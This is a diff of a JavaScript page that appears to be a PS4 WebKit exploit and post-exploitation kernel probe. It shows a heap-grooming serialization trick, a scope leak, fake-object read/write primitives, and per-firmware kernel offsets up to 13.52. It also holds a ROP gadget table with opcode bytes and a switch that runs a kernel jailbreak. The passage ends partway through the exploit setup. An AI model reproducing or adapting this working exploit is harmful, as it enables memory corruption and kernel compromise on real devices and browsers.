-        { key: "svuid",    label: "cr_svuid",     placeholder: "—" },
-        { key: "gid",      label: "cr_gid",       placeholder: "—" },
-        { key: "rgid",     label: "cr_rgid",      placeholder: "—" },
-        { key: "svgid",    label: "cr_svgid",     placeholder: "—" },
-        { key: "ngroups",  label: "cr_ngroups",   placeholder: "—" },
-        { key: "prison",   label: "cr_prison",    placeholder: "—" },
-        { key: "sce",      label: "sce flags",    placeholder: "—" }
-    ]},
-    { id: "prison", title: "prison0", icon: "▤", rows: [
-        { key: "addr",  label: "Address",   placeholder: "—" },
-        { key: "value", label: "Value",     placeholder: "—" },
-        { key: "refs",  label: "pr_ref",    placeholder: "—" },
-        { key: "name",  label: "pr_name",   placeholder: "—" }
-    ]},
-    { id: "root", title: "rootvnode", icon: "◈", rows: [
-        { key: "addr",   label: "Address",      placeholder: "—" },
-        { key: "value",  label: "Value",        placeholder: "—" },
-        { key: "type",   label: "v_type",       placeholder: "—" },
-        { key: "vfs",    label: "v_mount",      placeholder: "—" },
-        { key: "path",   label: "v_path hint",  placeholder: "—" }
-    ]},
-    { id: "sysent", title: "sysent Table", icon: "⚙", rows: [
-        { key: "addr",   label: "Entry 661 addr", placeholder: "—" },
-        { key: "narg",   label: "sy_narg",        placeholder: "—" },
-        { key: "call",   label: "sy_call",        placeholder: "—" },
-        { key: "thrcnt", label: "sy_thrcnt",      placeholder: "—" },
-        { key: "jmp",    label: "jmp rsi gadget", placeholder: "—" },
-        { key: "tbase",  label: "Table base",     placeholder: "—" },
-        { key: "entry0", label: "sysent[0]",      placeholder: "—" },
-        { key: "count",  label: "Entries read",   placeholder: "—" }
-    ]},
-    { id: "filedesc", title: "Filedesc", icon: "▥", rows: [
-        { key: "pfd",    label: "p_fd",           placeholder: "—" },
-        { key: "fdt",    label: "fd_ofiles",      placeholder: "—" },
-        { key: "nfds",   label: "fd_nfiles",      placeholder: "—" },
-        { key: "cd",     label: "fd_cdir",        placeholder: "—" },
-        { key: "rd",     label: "fd_rdir",        placeholder: "—" },
-        { key: "jdir",   label: "fd_jdir",        placeholder: "—" }
-    ]},
-    { id: "vm", title: "VM Space", icon: "◫", rows: [
-        { key: "vm",     label: "p_vmspace",      placeholder: "—" },
-        { key: "map",    label: "vm_map",         placeholder: "—" },
-        { key: "pmap",   label: "vm_pmap",        placeholder: "—" },
-        { key: "base",   label: "vm_map base",    placeholder: "—" },
-        { key: "top",    label: "vm_map top",     placeholder: "—" }
-    ]},
-    { id: "gadgets", title: "Gadgets & ROP", icon: "⟐", wide: true, gadgets: true }
-];
-
-/* ============================================================
- *  DASHBOARD BUILD + UPDATE
- * ============================================================ */
-function buildDashboard() {
-    var grid = document.getElementById("dashboard");
-    grid.innerHTML = "";
-    CARDS.forEach(function(card) {
-        var el = document.createElement("section");
-        el.className = "card" + (card.wide ? " wide" : "");
-        el.id = "card-" + card.id;
-
-        var hdr = document.createElement("div");
-        hdr.className = "card-header";
-        var title = document.createElement("div");
-        title.className = "card-title";
-        title.innerHTML = '<span class="card-icon">' + (card.icon || "▪") + '</span><span>' + card.title + '</span>';
-        var badge = document.createElement("span");
-        badge.className = "badge";
-        badge.id = "badge-" + card.id;
-        badge.textContent = "WAIT";
-        hdr.appendChild(title);
-        hdr.appendChild(badge);
-        el.appendChild(hdr);
-
-        var body = document.createElement("div");
-        body.className = "card-body";
-        body.id = "body-" + card.id;
-        el.appendChild(body);
-
-        if (card.gadgets) {
-            body.innerHTML = '<div class="gadget-grid" id="gadget-grid">' +
-                '<div class="gadget-group"><div class="gadget-group-title">Waiting for R/W</div>' +
-                '<div class="gadget-list"><div class="gadget empty">probe has not run yet</div></div></div></div>';
-        } else if (card.strings) {
-            body.innerHTML = '<div class="string-list" id="string-list"><div class="string-item"><span class="str">waiting for probe…</span></div></div>';
-        } else {
-            card.rows.forEach(function(row) {
-                var r = document.createElement("div");
-                r.className = "row";
-                r.id = "row-" + card.id + "-" + row.key;
-                var k = document.createElement("span");
-                k.className = "k";
-                k.textContent = row.label;
-                var v = document.createElement("span");
-                v.className = "v";
-                v.textContent = row.placeholder || "—";
-                r.appendChild(k); r.appendChild(v);
-                body.appendChild(r);
-            });
-        }
-        grid.appendChild(el);
-    });
-}
-
-function setRow(cardId, rowKey, value, level) {
-    var el = document.getElementById("row-" + cardId + "-" + rowKey);
-    if (!el) return;
-    el.className = "row" + (level ? " " + level : "");
-    var v = el.querySelector(".v");
-    if (v) v.textContent = (value === undefined || value === null || value === "") ? "—" : String(value);
-}
-
-function setBadge(cardId, text, level) {
-    var el = document.getElementById("badge-" + cardId);
-    if (!el) return;
-    el.className = "badge" + (level ? " " + level : "");
-    el.textContent = text;
-}
-
-function setCardState(cardId, level) {
-    var el = document.getElementById("card-" + cardId);
-    if (!el) return;
-    el.className = el.className.replace(/\s+(ok|bad|warn|running)\b/g, "");
-    if (level) el.className += " " + level;
-}
-
-/* ============================================================
- *  GADGET TABLE
- * ============================================================ */
-var GADGET_CATS = {
-    pop:     "Pop Registers",
-    stack:   "Stack Pivots",
-    priv:    "Privilege / Transition",
-    cr:      "Control Registers",
-    mov:     "Register Moves",
-    mem:     "Memory Access",
-    jmpcall: "Indirect Jumps & Calls",
-    misc:    "Misc"
-};
-var GADGET_CAT_ORDER = ["pop", "stack", "priv", "cr", "mov", "mem", "jmpcall", "misc"];
-
-var GADGETS = [
-    // -- pop registers --
-    { cat: "pop", name: "pop rax ; ret",              bytes: [0x58, 0xC3] },
-    { cat: "pop", name: "pop rbx ; ret",              bytes: [0x5B, 0xC3] },
-    { cat: "pop", name: "pop rcx ; ret",              bytes: [0x59, 0xC3] },
-    { cat: "pop", name: "pop rdx ; ret",              bytes: [0x5A, 0xC3] },
-    { cat: "pop", name: "pop rsi ; ret",              bytes: [0x5E, 0xC3] },
-    { cat: "pop", name: "pop rdi ; ret",              bytes: [0x5F, 0xC3] },
-    { cat: "pop", name: "pop rbp ; ret",              bytes: [0x5D, 0xC3] },
-    { cat: "pop", name: "pop rsp ; ret",              bytes: [0x5C, 0xC3] },
-    { cat: "pop", name: "pop r8  ; ret",              bytes: [0x41, 0x58, 0xC3] },
-    { cat: "pop", name: "pop r9  ; ret",              bytes: [0x41, 0x59, 0xC3] },
-    { cat: "pop", name: "pop r10 ; ret",              bytes: [0x41, 0x5A, 0xC3] },
-    { cat: "pop", name: "pop r11 ; ret",              bytes: [0x41, 0x5B, 0xC3] },
-    { cat: "pop", name: "pop r12 ; ret",              bytes: [0x41, 0x5C, 0xC3] },
-    { cat: "pop", name: "pop r13 ; ret",              bytes: [0x41, 0x5D, 0xC3] },
-    { cat: "pop", name: "pop r14 ; ret",              bytes: [0x41, 0x5E, 0xC3] },
-    { cat: "pop", name: "pop r15 ; ret",              bytes: [0x41, 0x5F, 0xC3] },
-
-    // -- stack pivots --
-    { cat: "stack", name: "leave ; ret",              bytes: [0xC9, 0xC3] },
-    { cat: "stack", name: "pop rsp ; pop rbp ; ret",  bytes: [0x5C, 0x5D, 0xC3] },
-    { cat: "stack", name: "xchg rax, rsp ; ret",      bytes: [0x48, 0x94, 0xC3] },
-    { cat: "stack", name: "xchg rsp, rax ; ret",      bytes: [0x48, 0x87, 0xE0, 0xC3] },
-    { cat: "stack", name: "mov rsp, rbp ; pop rbp",   bytes: [0x48, 0x89, 0xEC, 0x5D] },
-    { cat: "stack", name: "add rsp, 0x18 ; ret",      bytes: [0x48, 0x83, 0xC4, 0x18, 0xC3] },
-    { cat: "stack", name: "add rsp, 0x28 ; ret",      bytes: [0x48, 0x83, 0xC4, 0x28, 0xC3] },
-    { cat: "stack", name: "add rsp, 0x38 ; ret",      bytes: [0x48, 0x83, 0xC4, 0x38, 0xC3] },
-    { cat: "stack", name: "add rsp, 0x48 ; ret",      bytes: [0x48, 0x83, 0xC4, 0x48, 0xC3] },
-    { cat: "stack", name: "sub rsp, 0x28 ; ret",      bytes: [0x48, 0x83, 0xEC, 0x28, 0xC3] },
-
-    // -- privilege / transition --
-    { cat: "priv", name: "swapgs ; ret",              bytes: [0x0F, 0x01, 0xF8, 0xC3] },
-    { cat: "priv", name: "swapgs ; iretq",            bytes: [0x0F, 0x01, 0xF8, 0x48, 0xCF] },
-    { cat: "priv", name: "iretq",                     bytes: [0x48, 0xCF] },
-    { cat: "priv", name: "sysretq",                   bytes: [0x48, 0x0F, 0x07] },
-    { cat: "priv", name: "sysret",                    bytes: [0x0F, 0x07] },
-
-    // -- control registers --
-    { cat: "cr", name: "mov cr4, rdi ; ret",          bytes: [0x0F, 0x22, 0xE7, 0xC3] },
-    { cat: "cr", name: "mov cr4, rax",                bytes: [0x0F, 0x22, 0xE0] },
-    { cat: "cr", name: "mov cr4, rcx",                bytes: [0x0F, 0x22, 0xE1] },
-    { cat: "cr", name: "mov cr0, rdi",                bytes: [0x0F, 0x22, 0xC7] },
-    { cat: "cr", name: "mov cr3, rdi",                bytes: [0x0F, 0x22, 0xDF] },
-
-    // -- register moves --
-    { cat: "mov", name: "mov rdi, rax ; ...",         bytes: [0x48, 0x89, 0xC7] },
-    { cat: "mov", name: "mov rsi, rax ; ...",         bytes: [0x48, 0x89, 0xC6] },
-    { cat: "mov", name: "mov rdx, rax ; ...",         bytes: [0x48, 0x89, 0xC2] },
-    { cat: "mov", name: "mov rdi, rsp ; ...",         bytes: [0x48, 0x89, 0xE7] },
-    { cat: "mov", name: "mov rsp, rdi ; ...",         bytes: [0x48, 0x89, 0xFC] },
-    { cat: "mov", name: "xchg edi, eax",              bytes: [0x97] },
-    { cat: "mov", name: "xchg rax, rdi",              bytes: [0x48, 0x97] },
-
-    // -- memory access --
-    { cat: "mem", name: "mov rax, [rdi] ; ret",       bytes: [0x48, 0x8B, 0x07, 0xC3] },
-    { cat: "mem", name: "mov [rdi], rax ; ret",       bytes: [0x48, 0x89, 0x07, 0xC3] },
-    { cat: "mem", name: "mov rax, [rsi] ; ret",       bytes: [0x48, 0x8B, 0x06, 0xC3] },
-    { cat: "mem", name: "mov [rsi], rax ; ret",       bytes: [0x48, 0x89, 0x06, 0xC3] },
-    { cat: "mem", name: "mov eax, [rdi] ; ret",       bytes: [0x8B, 0x07, 0xC3] },
-    { cat: "mem", name: "mov [rdi], eax ; ret",       bytes: [0x89, 0x07, 0xC3] },
-
-    // -- indirect jmp / call --
-    { cat: "jmpcall", name: "jmp rax",                bytes: [0xFF, 0xE0] },
-    { cat: "jmpcall", name: "jmp rcx",                bytes: [0xFF, 0xE1] },
-    { cat: "jmpcall", name: "jmp rdx",                bytes: [0xFF, 0xE2] },
-    { cat: "jmpcall", name: "jmp rsi",                bytes: [0xFF, 0xE6] },
-    { cat: "jmpcall", name: "jmp rdi",                bytes: [0xFF, 0xE7] },
-    { cat: "jmpcall", name: "call rax",               bytes: [0xFF, 0xD0] },
-    { cat: "jmpcall", name: "call rcx",               bytes: [0xFF, 0xD1] },
-    { cat: "jmpcall", name: "call rdx",               bytes: [0xFF, 0xD2] },
-    { cat: "jmpcall", name: "call rsi",               bytes: [0xFF, 0xD6] },
-    { cat: "jmpcall", name: "call rdi",               bytes: [0xFF, 0xD7] },
-    { cat: "jmpcall", name: "jmp [rax]",              bytes: [0xFF, 0x20] },
-    { cat: "jmpcall", name: "jmp [rdi]",              bytes: [0xFF, 0x27] },
-    { cat: "jmpcall", name: "call [rax]",             bytes: [0xFF, 0x10] },
-    { cat: "jmpcall", name: "call [rdi]",             bytes: [0xFF, 0x17] },
-
-    // -- misc --
-    { cat: "misc", name: "ret",                       bytes: [0xC3] },
-    { cat: "misc", name: "nop ; ret",                 bytes: [0x90, 0xC3] },
-    { cat: "misc", name: "cli ; ret",                 bytes: [0xFA, 0xC3] },
-    { cat: "misc", name: "sti ; ret",                 bytes: [0xFB, 0xC3] },
-    { cat: "misc", name: "wrmsr",                     bytes: [0x0F, 0x30] },
-    { cat: "misc", name: "rdmsr",                     bytes: [0x0F, 0x32] },
-    { cat: "misc", name: "pushfq ; pop rax",          bytes: [0x9C, 0x58] },
-    { cat: "misc", name: "popfq",                     bytes: [0x9D] },
-    { cat: "misc", name: "syscall",                   bytes: [0x0F, 0x05] },
-    { cat: "misc", name: "sysenter",                  bytes: [0x0F, 0x34] },
-    { cat: "misc", name: "int 0x80",                  bytes: [0xCD, 0x80] },
-    { cat: "misc", name: "int3 ; ret",                bytes: [0xCC, 0xC3] }
-];
-
-var GADGET_HITS = {};
-GADGET_CAT_ORDER.forEach(function(c) { GADGET_HITS[c] = []; });
-
-function addGadgetHit(cat, name, addr) {
-    var list = GADGET_HITS[cat] || (GADGET_HITS[cat] = []);
-    for (var i = 0; i < list.length; i++) if (list[i].name === name) return;
-    list.push({ name: name, addr: addr });
-}
-
-function renderGadgets() {
-    var grid = document.getElementById("gadget-grid");
-    if (!grid) return;
-    var total = 0;
-    GADGET_CAT_ORDER.forEach(function(c) { total += (GADGET_HITS[c] || []).length; });
-
-    grid.innerHTML = "";
-    GADGET_CAT_ORDER.forEach(function(cat) {
-        var list = GADGET_HITS[cat] || [];
-        var group = document.createElement("div");
-        group.className = "gadget-group";
-        var title = document.createElement("div");
-        title.className = "gadget-group-title";
-        title.innerHTML = '<span>' + GADGET_CATS[cat] + '</span>' +
-                          '<span class="count' + (list.length ? ' hit' : '') + '">' +
-                          list.length + ' hit' + (list.length === 1 ? '' : 's') + '</span>';
-        group.appendChild(title);
-
-        var ul = document.createElement("div");
-        ul.className = "gadget-list";
-        if (list.length === 0) {
-            var empty = document.createElement("div");
-            empty.className = "gadget empty";
-            empty.textContent = "no hits";
-            ul.appendChild(empty);
-        } else {
-            list.forEach(function(g) {
-                var row = document.createElement("div");
-                row.className = "gadget";
-                var n = document.createElement("span");
-                n.className = "gadget-name";
-                n.textContent = g.name;
-                var a = document.createElement("span");
-                a.className = "gadget-addr";
-                a.textContent = g.addr;
-                row.appendChild(n); row.appendChild(a);
-                ul.appendChild(row);
-            });
-        }
-        group.appendChild(ul);
-        grid.appendChild(group);
-    });
-
-    if (total > 0) {
-        setBadge("gadgets", total + " HITS", "ok");
-        setCardState("gadgets", "ok");
-    } else {
-        setBadge("gadgets", "NO HITS", "warn");
-        setCardState("gadgets", "warn");
-    }
-    setStat("gadgets", total + " found", total > 0 ? "purple" : "warn");
-}
-
-/* ============================================================
- *  STRING LIST RENDERER
- * ============================================================ */
-function renderStrings(strings) {
-    var list = document.getElementById("string-list");
-    if (!list) return;
-    if (!strings.length) {
-        list.innerHTML = '<div class="string-item"><span class="str">no printable strings found in scanned windows</span></div>';
-        setStat("strings", "0 found", "warn");
-        return;
-    }
-    list.innerHTML = "";
-    strings.slice(0, 60).forEach(function(s) {
-        var row = document.createElement("div");
-        row.className = "string-item";
-        var a = document.createElement("span");
-        a.className = "addr";
-        a.textContent = s.addr;
-        var t = document.createElement("span");
-        t.className = "str";
-        t.textContent = s.text;
-        row.appendChild(a); row.appendChild(t);
-        list.appendChild(row);
-    });
-    setStat("strings", strings.length + " found", "ok");
-}
-
-/* ============================================================
- *  REPORT TEXT
- * ============================================================ */
-var headerMsg = "mansoor0x + OptiTronOffical [deep probe]";
-var headerBorder = "═".repeat(64);
-var headerPrinted = false;
-
-function printHeader() {
-    if (headerPrinted) return;
-    headerPrinted = true;
-    logLine(headerBorder, "info");
-    logLine(" " + headerMsg, "info");
-    logLine(" Credits:", "info");
-    logLine("   mansoor0x       - base HTML script", "info");
-    logLine("   primehat06-wq   - uploaded to GitHub / found repo", "info");
-    logLine("   OptiTronOffical - vibe coding, testing, repo dorking", "info");
-    logLine(" Mode: post-R/W deep kernel probe", "info");
-    logLine(headerBorder, "info");
-}
-
-function buildReportText() {
+function buildLogText() {
     var L = [];
-    L.push(headerBorder);
-    L.push(" PS4 Kernel Probe — Full Report");
-    L.push(headerBorder);
+    var line = "==================================================";
+    L.push(line);
+    L.push(" WebKit Exploit Log — " + headerMsg);
+    L.push(line);
     L.push("Revision     : " + (typeof REVISION !== "undefined" ? REVISION : "?"));
     L.push("Firmware     : " + (typeof FW_LABEL !== "undefined" && FW_LABEL ? FW_LABEL : "(undetected)"));
     L.push("User Agent   : " + navigator.userAgent);
@@ -1090,53 +348,58 @@ function buildReportText() {
                        "  FAIL=" + LOG.counts.fail +
                        "  WARN=" + LOG.counts.warn +
                        "  INFO=" + LOG.counts.info);
-    L.push(headerBorder);
-    L.push("");
-    L.push(" ── DASHBOARD SNAPSHOT ──");
-    CARDS.forEach(function(card) {
-        L.push("");
-        L.push("[" + card.title + "]");
-        if (card.gadgets) {
-            GADGET_CAT_ORDER.forEach(function(cat) {
-                var list = GADGET_HITS[cat] || [];
-                L.push("  " + GADGET_CATS[cat] + " (" + list.length + "):");
-                if (list.length === 0) L.push("    (no hits)");
-                else list.forEach(function(g) { L.push("    " + g.name + " @ " + g.addr); });
-            });
-        } else if (card.strings) {
-            var sl = document.getElementById("string-list");
-            if (sl) sl.querySelectorAll(".string-item").forEach(function(n) {
-                L.push("  " + n.textContent);
-            });
-        } else {
-            card.rows.forEach(function(row) {
-                var el = document.getElementById("row-" + card.id + "-" + row.key);
-                var v = el ? el.querySelector(".v").textContent : "—";
-                L.push("  " + pad(row.label, 20) + " : " + v);
-            });
-        }
-    });
-    L.push("");
-    L.push(headerBorder);
-    L.push(" ── FULL LOG ──");
+    L.push("Credits      :");
+    L.push("  mansoor0x       - base HTML script");
+    L.push("  primehat06-wq   - uploaded to GitHub / found repo");
+    L.push("  OptiTronOffical - vibe coding, testing, repo dorking");
+    L.push("--------------------------------------------------");
     for (var i = 0; i < LOG.lines.length; i++) {
         var e = LOG.lines[i];
         L.push("[" + fmtTime(e.t) + "] [" + pad(e.level.toUpperCase(), 4) + "] " + e.text);
     }
-    L.push("------------------------------------------------------------");
-    L.push("END OF REPORT (" + LOG.lines.length + " log entries)");
+    L.push("--------------------------------------------------");
+    L.push("END OF LOG (" + LOG.lines.length + " entries)");
     return L.join("\r\n");
 }
 
-function copyReport() {
-    var text = buildReportText();
+function downloadLog() {
+    try {
+        var text = buildLogText();
+        var blob = new Blob([text], { type: "text/plain;charset=utf-8" });
+        var url = URL.createObjectURL(blob);
+        var a = document.createElement("a");
+        var stamp = new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19);
+        a.href = url;
+        a.download = "ps4-probe-log-" + stamp + ".txt";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        setTimeout(function () { try { URL.revokeObjectURL(url); } catch (_) {} }, 10000);
+        logLine("LOG-SAVED file=ps4-probe-log-" + stamp + ".txt bytes=" + text.length, "info");
+    } catch (err) {
+        logLine("LOG-SAVE-FAILED " + err, "warn");
+    }
+}
+
+var autoSaveDone = false;
+function maybeAutoSave() {
+    if (autoSaveDone) return;
+    if (!LOG.autoSave) return;
+    autoSaveDone = true;
+    setTimeout(downloadLog, 400);
+}
+
+function copyLog() {
+    var text = buildLogText();
     try {
         if (navigator.clipboard && navigator.clipboard.writeText) {
             navigator.clipboard.writeText(text).then(
-                function () { logLine("REPORT-COPIED chars=" + text.length, "info"); },
+                function () { logLine("LOG-COPIED chars=" + text.length, "info"); },
                 function () { fallbackCopy(text); }
             );
-        } else { fallbackCopy(text); }
+        } else {
+            fallbackCopy(text);
+        }
     } catch (_) { fallbackCopy(text); }
 }
 
@@ -1150,9 +413,9 @@ function fallbackCopy(text) {
         ta.select();
         document.execCommand("copy");
         document.body.removeChild(ta);
-        logLine("REPORT-COPIED (fallback) chars=" + text.length, "info");
+        logLine("LOG-COPIED (fallback) chars=" + text.length, "info");
     } catch (err) {
-        logLine("REPORT-COPY-FAILED " + err, "warn");
+        logLine("LOG-COPY-FAILED " + err, "warn");
     }
 }
 
@@ -1165,23 +428,40 @@ function clearLog() {
 
 (function initUI() {
     try {
-        document.getElementById("btnCopy").addEventListener("click", copyReport);
+        document.getElementById("btnDownload").addEventListener("click", downloadLog);
+        document.getElementById("btnCopy").addEventListener("click", copyLog);
         document.getElementById("btnClear").addEventListener("click", clearLog);
         document.getElementById("chkAutoScroll").addEventListener("change", function (ev) {
             LOG.autoScroll = !!ev.target.checked;
         });
-        document.getElementById("btnToggleConsole").addEventListener("click", function () {
-            document.getElementById("consolePanel").classList.toggle("collapsed");
-        });
-        document.getElementById("consoleHead").addEventListener("click", function () {
-            document.getElementById("consolePanel").classList.toggle("collapsed");
+        document.getElementById("chkAutoSave").addEventListener("change", function (ev) {
+            LOG.autoSave = !!ev.target.checked;
         });
     } catch (_) {}
 })();
 
 /* ============================================================
- *  FIRMWARE TABLE
+ *  EXPLOIT (single-shot, no auto-retry)
  * ============================================================ */
+
+var headerMsg = "mansoor0x + OptiTronOffical [probe build]";
+var headerBorder = "=".repeat(50);
+var headerPrinted = false;
+
+function printHeader() {
+    if (headerPrinted) return;
+    headerPrinted = true;
+    logLine(headerBorder, "info");
+    logLine(" " + headerMsg, "info");
+    logLine(" Credits:", "info");
+    logLine("   mansoor0x       - base HTML script", "info");
+    logLine("   primehat06-wq   - uploaded to GitHub / found repo", "info");
+    logLine("   OptiTronOffical - vibe coding, testing, repo dorking", "info");
+    logLine(" Mode: post-R/W kernel probe (gadget/ROP/symbol enumeration)", "info");
+    logLine(headerBorder, "info");
+}
+
+// ========== PS4 OFFSETS ==========
 var PS4_OFFSETS = {
     "5.00": { evf: 0x7B3ED4, prison0: 0x10986A0, rootvnode: 0x22C19F0, sysent: 0x1084200, jmp: 0x13460 },
     "5.03": { evf: 0x7B42E4, prison0: 0x10986A0, rootvnode: 0x22C1A70, sysent: 0x1084200, jmp: 0x13460 },
@@ -1214,13 +494,16 @@ var PS4_OFFSETS = {
     "13.52": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 }
 };
 
-/* ============================================================
- *  CONFIG
- * ============================================================ */
+// ========== PARAMETERS ==========
 var Q = new URLSearchParams(location.search);
 var requestedDrain = parseInt(Q.get("n") || "128", 10);
 var DRAIN_COUNT = isFinite(requestedDrain) ? Math.max(64, Math.min(1024, requestedDrain)) : 512;
 var LITE = Q.get("l") === "1";
+
+/* Post-R/W behaviour:
+ *   default  → PROBE kernel (dump structs + scan for gadgets/ROP)
+ *   ?jb=1    → run legacy kernel jailbreak instead
+ */
 var RUN_JAILBREAK = Q.get("jb") === "1";
 
 var REVISION = "genuine-u8-rw-3-1352-probe";
@@ -1250,21 +533,35 @@ var FINAL_HOLE_SIZE = 0x80000;
 
 var seq = 0;
 var referenceTarget = null;
-var rwBuffer = null, rwView = null, rwMirror = null;
-var targetBuffer = null, targetView = null;
-var fakeHost = null, lengthWord = null;
-var fillerGraph = null, outerGraph = null;
+var rwBuffer = null;
+var rwView = null;
+var rwMirror = null;
+var targetBuffer = null;
+var targetView = null;
+var fakeHost = null;
+var lengthWord = null;
+var fillerGraph = null;
+var outerGraph = null;
 
-var leakedScope = null, getterCarrier = null, preparedSymbolObject = null;
-var capturedString = null, capturedWords = null, copiedLength = 0;
-var captureState = 0, captureError = null;
-var hostAddress = NaN, fakeAddress = NaN;
+var leakedScope = null;
+var getterCarrier = null;
+var preparedSymbolObject = null;
+var capturedString = null;
+var capturedWords = null;
+var copiedLength = 0;
+var captureState = 0;
+var captureError = null;
+var hostAddress = NaN;
+var fakeAddress = NaN;
 
 var keepAlive = new Array(DRAIN_COUNT + 3);
 var keepIndex = 0;
 var predecessorWords = null;
-var pointerLow = 0, pointerHigh = 0;
-var targetAddress = NaN, targetAddressLow = 0, targetAddressHigh = 0;
+var pointerLow = 0;
+var pointerHigh = 0;
+var targetAddress = NaN;
+var targetAddressLow = 0;
+var targetAddressHigh = 0;
 
 var rwHeader = new Uint8Array(CELL_BYTES);
 var targetHeader = new Uint8Array(CELL_BYTES);
@@ -1273,15 +570,23 @@ var scratchBytes = new Uint8Array(scratchBits);
 var scratchWords = new Uint32Array(scratchBits);
 var scratchDouble = new Float64Array(scratchBits);
 
-var rwOriginalVector = NaN, targetVector = NaN;
-var rwHeaderOK = false, targetHeaderOK = false;
-var readObserved = false, writeObserved = false, restoreObserved = false;
+var rwOriginalVector = NaN;
+var targetVector = NaN;
+var rwHeaderOK = false;
+var targetHeaderOK = false;
+var readObserved = false;
+var writeObserved = false;
+var restoreObserved = false;
 var retrySafe = false;
 
-var compositionState = 0, compositionLength = 0, compositionError = null;
+var compositionState = 0;
+var compositionLength = 0;
+var compositionError = null;
+
 var globalFakeArray = null;
 var testRun = false;
 
+// ========== FIRMWARE DETECTION ==========
 var FW_LABEL = (function() {
     var m = /PlayStation 4\/(\d+)\.(\d+)/.exec(navigator.userAgent);
     if (m) return m[1] + "." + m[2].padStart(2, "0");
@@ -1290,41 +595,49 @@ var FW_LABEL = (function() {
     if (match) return match[1] + "." + match[2].padStart(2, "0");
     return "";
 })();
+
 var fwOffsets = PS4_OFFSETS[FW_LABEL] || PS4_OFFSETS[""];
 
-/* ============================================================
- *  UTILITY
- * ============================================================ */
+// ========== UTILITY ==========
 function mark(tag, extra) {
     if (!headerPrinted) printHeader();
     seq++;
-    var line = seq + "-" + tag + (extra !== undefined ? "-" + extra : "");
+    var line = seq + "-rw-" + tag + (extra !== undefined ? "-" + extra : "");
     var level = classify(tag, extra);
     logLine(line, level);
     try { updateStatusFromMark(tag, extra); } catch (_) {}
 }
-function hex(value) { return "0x" + BigInt(value).toString(16); }
-function buffer(size) { return new ArrayBuffer(size); }
+
+function hex(value) {
+    return "0x" + value.toString(16);
+}
+
+function buffer(size) {
+    return new ArrayBuffer(size);
+}
+
 function uint32At(bytes, offset) {
     return bytes[offset] + bytes[offset+1]*0x100 + bytes[offset+2]*0x10000 + bytes[offset+3]*0x1000000;
 }
+
 function plausibleCell(value) {
     return value > 0x100000000 && value <= 0xffffffffffff && value <= 9007199254740991 && Math.floor(value) === value && value % 8 === 0;
 }
-function plausibleKptr(v) {
-    return v > 0xffff000000000000n && v < 0xffffffffffffffffn;
-}
+
 function pointerFromWords(words, offset) {
     if (words[offset+3] !== 0) return NaN;
     return words[offset] + words[offset+1]*0x10000 + words[offset+2]*0x100000000;
 }
+
 function encodedHeaderNumber() {
     var raw = new ArrayBuffer(8);
     var u32 = new Uint32Array(raw);
     var f64 = new Float64Array(raw);
-    u32[0] = 0x00004250; u32[1] = 0x01062800;
+    u32[0] = 0x00004250;
+    u32[1] = 0x01062800;
     return f64[0];
 }
+
 function leakScopeObject() {
     class Leaker { leak() { return super.foo; } }
     Leaker.prototype.__proto__ = new Proxy({}, {
@@ -1333,6 +646,7 @@ function leakScopeObject() {
     var leak = Leaker.prototype.leak;
     return (function() { return leak(); })();
 }
+
 function prepareSymbolWrapper(F) {
     leakedScope = leakScopeObject();
     if (leakedScope === undefined || leakedScope === null) throw new Error("scope-not-leaked");
@@ -1341,64 +655,69 @@ function prepareSymbolWrapper(F) {
     Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
     return Object(leakedScope.g);
 }
+
 function failTerminal(reason, detail) {
     attemptSucceeded = false;
     mark("FAILED-TERMINAL", "reason=" + reason + (detail ? "-" + detail : ""));
     try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
 }
-function readCString(addr, maxLen) {
-    maxLen = maxLen || 64;
-    var out = "";
-    var b = readBytes(addr, maxLen);
-    for (var i = 0; i < b.length; i++) {
-        if (b[i] === 0) break;
-        if (b[i] < 0x20 || b[i] > 0x7e) { out += "?"; continue; }
-        out += String.fromCharCode(b[i]);
-    }
-    return out;
-}
 
-/* ============================================================
- *  EXPLOIT CORE (unchanged)
- * ============================================================ */
+// ========== EXPLOIT CORE ==========
 function buildFakeHost() {
     rwBuffer = new ArrayBuffer(0x100);
     rwView = new Uint8Array(rwBuffer);
     rwMirror = new Uint8Array(rwBuffer);
     rwMirror[0] = 0x3c;
+
     targetBuffer = new ArrayBuffer(0x20);
     targetView = new Uint8Array(targetBuffer);
     targetView[0] = 0xa5;
     lengthWord = { keep: 0x51515151 };
+
     fakeHost = {
         q0: encodedHeaderNumber(),
-        q1: 1.1, q2: rwView, q3: lengthWord, q4: 2.2, q5: 3.3
+        q1: 1.1,
+        q2: rwView,
+        q3: lengthWord,
+        q4: 2.2,
+        q5: 3.3
     };
-    delete fakeHost.q1; delete fakeHost.q4; delete fakeHost.q5;
+
+    delete fakeHost.q1;
+    delete fakeHost.q4;
+    delete fakeHost.q5;
+
     if (!isFinite(fakeHost.q0) || fakeHost.q2 !== rwView || fakeHost.q3 !== lengthWord || rwView[0] !== 0x3c || targetView[0] !== 0xa5)
         throw new Error("fake-host-shape-failed");
 }
+
 function buildAndStoreGraph() {
     referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
     buildFakeHost();
+
     mark("SSV-BUILD", "k=" + K + "-n=" + DRAIN_COUNT);
     fillerGraph = new Array(0xfffd);
-    var pos = 0, huge = 1n << 40n;
+    var pos = 0;
+    var huge = 1n << 40n;
     for (var b = 0; b < FILLER_BIGINTS; ++b) fillerGraph[pos++] = huge + BigInt(b);
     for (var o = 0; o < FILLER_OBJECTS; ++o) fillerGraph[pos++] = {};
+
     outerGraph = new Array(CONTROL_INDEX + 1);
     outerGraph[0] = fillerGraph;
     outerGraph[1] = referenceTarget;
     outerGraph[2] = referenceTarget;
     outerGraph[CONTROL_INDEX] = CONTROL_INT;
     mark("SSV-BUILT", "duplicate-index=" + DUPLICATE_INDEX);
+
     mark("SSV-STORE-ENTER", "writer-ref=0x" + (0x10000 - K).toString(16));
     history.replaceState(outerGraph, "");
     mark("SSV-STORED", "fake-host-rw-target-not-serialized");
 }
+
 function prepareAddrof() {
     capturedWords = new Uint16Array(16);
     getterCarrier = function getterCarrierFunction() { return 7; };
+
     mark("ADDROF-PREP-BEGIN", "slots=" + CARRIER_SLOTS + "-bytes=" + CARRIER_BYTES);
     getterCarrier[0] = fakeHost;
